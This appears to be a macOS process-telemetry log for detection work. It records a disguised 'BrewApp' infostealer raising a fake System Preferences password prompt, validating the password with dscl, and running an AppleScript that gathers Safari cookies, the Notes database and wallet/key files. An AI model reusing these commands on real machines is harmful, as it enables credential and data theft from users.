process.parent.name,process.parent.pid,process.group_leader.pid,process.session_leader.pid,process.pid,process.command_line,process.executable,@timestamp,host.os.family,host.name,user.name
/bin/bash,11070,11069,10950,11071,/usr/bin/find /Users/michael.scott/.bash_sessions/_expiration_check_timestamp -mtime -1d,/usr/bin/find,2024-11-21T23:57:05.155Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10952,10951,10950,10953,/usr/libexec/path_helper -s,/usr/libexec/path_helper,2024-11-21T23:56:48.133Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10961,sh -c system_profiler SPHardwareDataType,/bin/sh,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/bin/sh,10957,10957,10950,10960,sh -c sw_vers,/bin/bash,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10958,"sh -c osascript -e 'tell application ""Terminal"" to set visible of front window to false'",/bin/sh,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10959,sh -c mkdir /Users/michael.scott/211052263,/bin/sh,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/usr/sbin/system_profiler,10963,10964,10950,10964,/usr/sbin/system_profiler -nospawn -xml SPDisplaysDataType -detailLevel full,/usr/sbin/system_profiler,2024-11-21T23:56:49.136Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10963,sh -c system_profiler SPDisplaysDataType,/bin/sh,2024-11-21T23:56:49.135Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10966,"sh -c osascript -e 'display dialog ""To launch the application, you need to update the system settings \n\nPlease enter your password."" with title ""System Preferences"" with icon caution default answer """" giving up after 30 with hidden answer'",/bin/sh,2024-11-21T23:56:49.137Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10965,"sh -c dscl /Local/Default -authonly michael.scott """"",/bin/sh,2024-11-21T23:56:49.136Z,darwin,scr-office-imac.local,michael.scott
/usr/libexec/xpcproxy,1,10968,1,10968,/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared -s mdworker -c MDSImporterWorker -m com.apple.mdworker.shared,/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared,2024-11-21T23:56:50.138Z,darwin,scr-office-imac.local,michael.scott
/sbin/launchd,1,1,1,10968,xpcproxy com.apple.mdworker.shared.07000000-0100-0000-0000-000000000000,/usr/libexec/xpcproxy,2024-11-21T23:56:50.138Z,darwin,scr-office-imac.local,root
/sbin/launchd,1,1,1,10967,xpcproxy com.apple.speech.MacinTalkFramework.WardaSynthesizer.arm64 499,/usr/libexec/xpcproxy,2024-11-21T23:56:50.138Z,darwin,scr-office-imac.local,root
/bin/sh,10957,10957,10950,10970,sh -c mkdir -p '/Users/michael.scott/211052263/Chromium/Chrome',/bin/bash,2024-11-21T23:56:53.140Z,darwin,scr-office-imac.local,michael.scott
/Volumes/BrewApp/BrewApp,10957,10957,10950,10971,"sh -c echo '
Installed Apps:
' >> /Users/michael.scott/211052263/Sysinfo.txt && mdfind ""kMDItemContentType == 'com.apple.application-bundle' && kMDItemKind != 'System'"" | grep -v '/System' | xargs -I % basename ""%"" >> /Users/michael.scott/211052263/Sysinfo.txt",/bin/sh,2024-11-21T23:56:54.140Z,darwin,scr-office-imac.local,michael.scott
/usr/libexec/xpcproxy,1,11046,11046,11046,/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/Resources/DesktopServicesHelper,/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/Versions/A/Resources/DesktopServicesHelper,2024-11-21T23:56:54.143Z,darwin,scr-office-imac.local,root
/usr/bin/xargs,10974,10957,10950,11004,basename /Applications/ElasticEndpoint.app,/usr/bin/basename,2024-11-21T23:56:54.141Z,darwin,scr-office-imac.local,michael.scott
/usr/bin/xargs,10974,10957,10950,11034,basename /Library/Application Support/Script Editor/Templates/Droplets/Recursive File Processing Droplet.app,/usr/bin/basename,2024-11-21T23:56:54.142Z,darwin,scr-office-imac.local,michael.scott
/usr/bin/xargs,10974,10957,10950,11010,basename /Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app,/usr/bin/basename,2024-11-21T23:56:54.142Z,darwin,scr-office-imac.local,michael.scott
/usr/libexec/xpcproxy,1,11045,11045,11045,/System/Library/Frameworks/NetFS.framework/Versions/A/XPCServices/PlugInLibraryService.xpc/Contents/MacOS/PlugInLibraryService,/System/Library/Frameworks/NetFS.framework/Versions/A/XPCServices/PlugInLibraryService.xpc/Contents/MacOS/PlugInLibraryService,2024-11-21T23:56:54.143Z,darwin,scr-office-imac.local,michael.scott
/usr/bin/xargs,10974,10957,10950,10995,basename /Applications/Google Chrome.app,/usr/bin/basename,2024-11-21T23:56:54.141Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10957,10957,10950,11044,"osascript -e set baseFolderPath to (path to home folder as text) & ""211052263"" -e set fileGrabberFolderPath to (path to home folder as text) & ""211052263:FileGrabber:"" -e tell application ""Finder"" -e set username to short user name of (system info) -e try -e if not (exists folder fileGrabberFolderPath) then -e make new folder at folder baseFolderPath with properties {name:""FileGrabber""} -e end if -e set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"") -e try -e duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder baseFolderPath with replacing -e end try -e set homePath to path to home folder as string -e set sourceFilePath to homePath & ""Library:Group Containers:group.com.apple.notes:"" -e try -e duplicate file ""NoteStore.sqlite"" of folder sourceFilePath to folder baseFolderPath with replacing -e end try -e set extensionsList to {""txt"", ""docx"", ""rtf"", ""doc"", ""wallet"", ""keys"", ""key""} -e set desktopFiles to every file of desktop -e set documentsFiles to every file of folder ""Documents"" of (path to home folder) -e repeat with aFile in (desktopFiles & documentsFiles) -e set fileExtension to name extension of aFile -e if fileExtension is in extensionsList then -e set fileSize to size of aFile -e if fileSize ≤ 51200 then -e duplicate aFile to folder fileGrabberFolderPath with replacing -e end if -e end if -e end repeat -e end try -e end tell",/usr/bin/osascript,2024-11-21T23:56:54.143Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10971,10957,10950,10973,grep -v /System,/usr/bin/grep,2024-11-21T23:56:54.140Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,11059,11058,10950,11060,/bin/date +%s,/bin/date,2024-11-21T23:57:05.155Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,11073,10951,10950,11075,/usr/bin/wc -l,/usr/bin/wc,2024-11-21T23:57:05.156Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10957,10957,10950,10958,"osascript -e tell application ""Terminal"" to set visible of front window to false",/usr/bin/osascript,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10957,10957,10950,10960,sw_vers,/usr/bin/sw_vers,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10951,10951,10950,10954,mkdir -m 700 -p /Users/michael.scott/.bash_sessions,/bin/mkdir,2024-11-21T23:56:48.134Z,darwin,scr-office-imac.local,michael.scott
/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal,520,10950,10950,10950,login -pf michael.scott,/usr/bin/login,2024-11-21T23:56:48.133Z,darwin,scr-office-imac.local,michael.scott
/bin/bash,10957,10957,10950,10970,mkdir -p /Users/michael.scott/211052263/Chromium/Chrome,/bin/mkdir,2024-11-21T23:56:53.140Z,darwin,scr-office-imac.local,michael.scott
/bin/sh,10957,10957,10950,11044,"sh -c osascript -e 'set baseFolderPath to (path to home folder as text) & ""211052263""' -e 'set fileGrabberFolderPath to (path to home folder as text) & ""211052263:FileGrabber:""' -e 'tell application ""Finder""' -e 'set username to short user name of (system info)' -e 'try' -e 'if not (exists folder fileGrabberFolderPath) then' -e 'make new folder at folder baseFolderPath with properties {name:""FileGrabber""}' -e 'end if' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'try' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder baseFolderPath with replacing' -e 'end try' -e 'set homePath to path to home folder as string' -e 'set sourceFilePath to homePath & ""Library:Group Containers:group.com.apple.notes:""' -e 'try' -e 'duplicate file ""NoteStore.sqlite"" of folder sourceFilePath to folder baseFolderPath with replacing' -e 'end try' -e 'set extensionsList to {""txt"", ""docx"", ""rtf"", ""doc"", ""wallet"", ""keys"", ""key""}' -e 'set desktopFiles to every file of desktop' -e 'set documentsFiles to every file of folder ""Documents"" of (path to home folder)' -e 'repeat with aFile in (desktopFiles & documentsFiles)' -e 'set fileExtension to name extension of aFile' -e 'if fileExtension is in extensionsList then' -e 'set fileSize to size of aFile' -e 'if fileSize ≤ 51200 then' -e 'duplicate aFile to folder fileGrabberFolderPath with replacing' -e 'end if' -e 'end if' -e 'end repeat' -e 'end try' -e 'end tell'",/bin/bash,2024-11-21T23:56:54.143Z,darwin,scr-office-imac.local,michael.scott
/sbin/launchd,1,1,1,11046,xpcproxy com.apple.DesktopServicesHelper.B55D977E-154C-4BC9-B53D-F2B1C3D4D4B9,/usr/libexec/xpcproxy,2024-11-21T23:56:54.143Z,darwin,scr-office-imac.local,root
/usr/bin/xargs,10974,10957,10950,11037,basename /Library/Application Support/Script Editor/Templates/Droplets/Droplet with Settable Properties.app,/usr/bin/basename,2024-11-21T23:56:54.142Z,darwin,scr-office-imac.local,michael.scott
/usr/bin/xargs,10974,10957,10950,10989,basename /Users/michael.scott/Downloads/New Updates in Crypto Exchange (2024-08-28).app,/usr/bin/basename,2024-11-21T23:56:54.141Z,darwin,scr-office-imac.local,michael.scott
/usr/bin/xargs,10974,10957,10950,11007,basename /usr/local/Homebrew/Library/Homebrew/test/support/fixtures/cask/NewApp.app,/usr/bin/basename,2024-11-21T23:56:54.141Z,darwin,scr-office-imac.local,michael.scott
